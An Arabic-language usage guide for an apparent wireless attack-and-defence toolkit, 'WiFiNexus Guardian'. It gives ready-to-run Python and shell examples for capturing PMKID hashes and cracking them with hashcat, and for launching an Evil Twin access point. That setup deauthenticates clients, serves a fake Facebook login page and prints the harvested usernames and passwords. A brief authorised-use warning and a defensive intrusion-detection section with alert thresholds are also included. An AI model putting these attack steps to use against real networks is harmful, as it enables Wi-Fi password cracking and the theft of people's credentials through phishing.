# 🔧 دليل الاستخدام - الوحدات الجديدة WiFiNexus Guardian

## 📋 المحتويات
1. [مدقق الأدوات](#1-مدقق-الأدوات-tool-validator)
2. [هجوم PMKID](#2-هجوم-pmkid)
3. [هجوم Evil Twin](#3-هجوم-evil-twin)
4. [نظام WIDS الدفاعي](#4-نظام-wids-الدفاعي)
5. [إدارة العمليات](#5-إدارة-العمليات)

---

## 1. مدقق الأدوات (Tool Validator)

### الاستخدام الأساسي:
```python
from tools.validator import ToolValidator

# إنشاء المدقق
validator = ToolValidator()

# التحقق من جميع الأدوات
results = validator.validate_all()

# عرض النتائج
print(validator.get_summary())

# تصدير تقرير JSON
validator.export_report("tool_validation_report.json")
```

### مثال على المخرجات:
```
=== Tool Validation Summary ===
Total Tools Checked: 12
Installed: 8/12
Compatible: 6/12
Critical Issues: 0

✅ aircrack-ng: aircrack-ng v1.6 found at /usr/bin/aircrack-ng
✅ iw: iw v5.9 found at /usr/bin/iw
❌ hashcat: hashcat is not installed. Install with: hashcat
⚠️ hcxdumptool: hcxdumptool v5.0 is outdated. Minimum required: 6.0
```

---

## 2. هجوم PMKID

### الاستخدام الأساسي:
```python
from attacks.pmkid_attacker import PMKIDAttacker

# إنشاء المهاجم
attacker = PMKIDAttacker(interface="wlan0", output_dir="captures")

# تنفيذ الهجوم
result = attacker.capture_pmkid(
    target_bssid="AA:BB:CC:DD:EE:FF",
    channel=6,
    essid="TargetNetwork",
    timeout=30
)

# معالجة النتيجة
if result.success:
    print(f"✅ PMKID Captured: {result.pmkid_hash}")
    print(f"📁 Hash File: {result.pcap_file}")
    
    # استخدام مع hashcat
    # hashcat -m 16800 captured_hash.txt wordlist.txt
else:
    print(f"❌ Failed: {result.message}")
```

### كسر كلمة المرور باستخدام Hashcat:
```bash
# بعد التقاط PMKID
hashcat -m 16800 captures/pmkid_AA_BB_CC_DD_EE_FF.16800 /path/to/wordlist.txt

# عرض كلمة المرور المكسورة
hashcat -m 16800 --show captures/pmkid_*.16800
```

### المميزات:
- ⚡ أسرع من المصافحة الرباعية (لا حاجة للانتظار)
- 🥷 أكثر خفاءً (لا حاجة لإرسال حزم Deauth)
- 🎯 يعمل حتى بدون عملاء متصلين

---

## 3. هجوم Evil Twin

### الاستخدام الأساسي:
```python
from attacks.evil_twin_engine import EvilTwinEngine, EvilTwinConfig

# تكوين الهجوم
config = EvilTwinConfig(
    target_bssid="AA:BB:CC:DD:EE:FF",
    target_essid="TargetWiFi",
    target_channel=6,
    interface="wlan0",
    fake_essid="TargetWiFi Free",  # اسم الشبكة الوهمية
    use_ssl=True,
    captive_portal=True,
    phishing_page="default",
    harvest_credentials=True,
    deauth_clients=True,
    output_dir="captures/evil_twin"
)

# إنشاء المحرك
engine = EvilTwinEngine(config)

# بدء الهجوم
if engine.start_attack():
    print("✅ Evil Twin attack started!")
    
    # مراقبة الحالة
    import time
    try:
        while True:
            status = engine.get_status()
            print(f"Clients: {status['clients_connected']}, "
                  f"Credentials: {status['credentials_captured']}")
            time.sleep(5)
    except KeyboardInterrupt:
        engine.stop_attack()
else:
    print("❌ Failed to start attack")
```

### مراقبة البيانات المسروقة:
```python
# الحصول على البيانات المسروقة
credentials = engine.get_captured_credentials()

for cred in credentials:
    print(f"🎯 {cred.timestamp} | {cred.ip_address} | "
          f"{cred.username}:{cred.password}")

# أو قراءة الملف مباشرة
with open("captures/evil_twin/captured_credentials.txt", "r") as f:
    print(f.read())
```

### تخصيص صفحة التصيد:
```python
# إنشاء قالب مخصص
template_path = Path("captures/evil_twin/templates/facebook_login.html")
template_path.write_text("""
<!DOCTYPE html>
<html>
<head><title>Facebook Login</title></head>
<body>
<form action="/login" method="POST">
    <input type="text" name="username" placeholder="Email">
    <input type="password" name="password" placeholder="Password">
    <button>Login</button>
</form>
</body>
</html>
""")

# استخدام القالب
config.phishing_page = "facebook_login"
```

### ⚠️ تحذيرات أمنية:
- استخدم **فقط** في بيئات اختبار مصرح بها
- هجوم التصيد غير قانوني بدون إذن كتابي
- مسؤوليتك القانونية الكاملة عن الاستخدام

---

## 4. نظام WIDS الدفاعي

### الاستخدام الأساسي:
```python
from defense.wids_monitor import WirelessIDSEngine

# إنشاء النظام
wids = WirelessIDSEngine(interface="wlan0", monitoring_dir="captures/wids")

# إضافة callback للتنبيهات الفورية
def on_alert(alert):
    print(f"🚨 ALERT: {alert.alert_type} - {alert.description}")
    print(f"   Severity: {alert.severity}")
    print(f"   Action: {alert.recommended_action}")

wids.add_alert_callback(on_alert)

# بدء المراقبة
wids.start_monitoring()
print("✅ WIDS monitoring started...")

# محاكاة حزمة (في الواقع تأتي من packet analyzer)
import time
try:
    while True:
        # عرض الحالة كل 10 ثواني
        status = wids.get_status()
        print(f"\n📊 Status: {status['known_devices']} devices, "
              f"{status['total_alerts']} alerts")
        
        # عرض آخر التنبيهات
        alerts = wids.get_alerts(limit=5)
        for alert in alerts[-3:]:
            print(f"  • [{alert.severity}] {alert.alert_type}: {alert.description}")
        
        time.sleep(10)
except KeyboardInterrupt:
    wids.stop_monitoring()
```

### تصدير تقرير:
```python
# تصدير تقرير JSON شامل
wids.export_report("wids_security_report.json")

# الحصول على تنبيهات محددة
critical_alerts = wids.get_alerts(severity="critical")
evil_twin_alerts = wids.get_alerts(alert_type="EVIL_TWIN")
```

### أنواع الهجمات المكتشفة:

| النوع | العتبة | الإجراء الموصى به |
|-------|--------|------------------|
| DEAUTH_FLOOD | >10 حزم/دقيقة | حظر MAC المصدر |
| EVIL_TWIN | ≥5 APs بنفس SSID | التحقق من الشرعية |
| PROBE_FLOOD | >30 طلب/دقيقة | مراقبة التجسس |
| AUTH_FLOOD | >20 محاولة/دقيقة | تفعيل Rate Limiting |

---

## 5. إدارة العمليات (Process Manager)

### الاستخدام المتقدم:
```python
from core.process_manager import RobustProcessManager, ProcessExecutionError

# إنشاء مدير العمليات
pm = RobustProcessManager(
    timeout=300,      # 5 دقائق مهلة
    max_retries=3,    # 3 محاولات
    retry_delay=2.0   # ثانيتين بين المحاولات
)

# تنفيذ أمر مع معالجة أخطاء
try:
    success, stdout, stderr = pm.execute(
        ["airodump-ng", "--bssid", "AA:BB:CC:DD:EE:FF", "wlan0"],
        capture_output=True,
        require_success=False,  # عدم رفع exception عند الفشل
        description="Capture packets"
    )
    
    if success:
        print(f"✅ Success: {stdout[:200]}")
    else:
        print(f"⚠️ Failed: {stderr}")
        
except ProcessExecutionError as e:
    print(f"❌ Execution Error: {e.command} - {e.stderr}")
except Exception as e:
    print(f"❌ Unexpected Error: {e}")

# التحقق من وجود أداة
if RobustProcessManager.check_command_exists("aircrack-ng"):
    version = RobustProcessManager.get_command_version("aircrack-ng")
    print(f"aircrack-ng {version} is available")
else:
    print("aircrack-ng is NOT installed")

# تنظيف جميع العمليات العالقة
pm.cleanup_all()
```

### مثال متقدم مع Validator:
```python
from core.process_manager import RobustProcessManager
from tools.validator import ToolValidator

# التحقق أولاً ثم التنفيذ
validator = ToolValidator()
results = validator.validate_all()

# تنفيذ فقط إذا كانت الأدوات متوفرة
if results["aircrack-ng"].status.value == "compatible":
    pm = RobustProcessManager()
    success, stdout, stderr = pm.execute(
        ["aircrack-ng", "-h"],
        description="Show aircrack-ng help"
    )
    print(stdout)
else:
    print(f"❌ Cannot proceed: {results['aircrack-ng'].message}")
```

---

## 🔄 دمج جميع الوحدات في سيناريو واحد

### مثال: فحص شامل وهجوم مضاد
```python
#!/usr/bin/env python3
"""
سيناريو متكامل: فحص + هجوم PMKID + مراقبة دفاعية
"""

from tools.validator import ToolValidator
from attacks.pmkid_attacker import PMKIDAttacker
from defense.wids_monitor import WirelessIDSEngine
import time

def main():
    print("🔐 WiFiNexus Guardian - Advanced Security Scenario\n")
    
    # 1. التحقق من الأدوات
    print("📋 Step 1: Validating tools...")
    validator = ToolValidator()
    results = validator.validate_all()
    print(validator.get_summary())
    
    if not results.get("aircrack-ng") or \
       results["aircrack-ng"].status.value != "compatible":
        print("❌ Cannot proceed without aircrack-ng")
        return
    
    # 2. بدء المراقبة الدفاعية
    print("\n🛡️ Step 2: Starting defensive monitoring...")
    wids = WirelessIDSEngine(interface="wlan0")
    wids.start_monitoring()
    
    # 3. تنفيذ هجوم PMKID
    print("\n⚔️ Step 3: Executing PMKID attack...")
    attacker = PMKIDAttacker(interface="wlan0")
    
    result = attacker.capture_pmkid(
        target_bssid="AA:BB:CC:DD:EE:FF",
        channel=6,
        essid="TestNetwork",
        timeout=30
    )
    
    if result.success:
        print(f"\n✅ PMKID Captured Successfully!")
        print(f"📄 Hash: {result.pmkid_hash[:50]}...")
        print(f"💾 Saved to: {result.pcap_file}")
        print(f"\n🔓 To crack with hashcat:")
        print(f"   hashcat -m 16800 {result.pcap_file} wordlist.txt")
    else:
        print(f"\n❌ PMKID Capture Failed: {result.message}")
    
    # 4. عرض حالة WIDS
    print("\n📊 Step 4: WIDS Monitoring Status...")
    status = wids.get_status()
    print(f"   Devices tracked: {status['known_devices']}")
    print(f"   Alerts generated: {status['total_alerts']}")
    
    # 5. إيقاف المراقبة
    print("\n🛑 Step 5: Stopping monitoring...")
    wids.stop_monitoring()
    
    # 6. تصدير التقارير
    print("\n💾 Step 6: Exporting reports...")
    validator.export_report("validation_report.json")
    wids.export_report("wids_report.json")
    print("   ✅ Reports saved!")
    
    print("\n✅ Scenario completed successfully!")

if __name__ == "__main__":
    main()
```

---

## 📞 الدعم والاستكشاف

### المشاكل الشائعة:

**1. خطأ "Permission Denied"**
```bash
sudo python3 script.py
# أو
setcap cap_net_raw+ep /usr/bin/python3
```

**2. الأداة غير مثبتة**
```bash
# Debian/Ubuntu
sudo apt install aircrack-ng hashcat hcxdumptool wireshark

# Arch Linux
sudo pacman -S aircrack-ng hashcat hcxdumptool wireshark-cli
```

**3. الواجهة لا تدخل Monitor Mode**
```bash
sudo ip link set wlan0 down
sudo iw wlan0 set type monitor
sudo ip link set wlan0 up
sudo iw wlan0 info  # للتحقق
```

---

*دليل الاستخدام الكامل - WiFiNexus Guardian v2.0*
*للمزيد من المعلومات: README.md و IMPLEMENTATION_REPORT_AR.md*
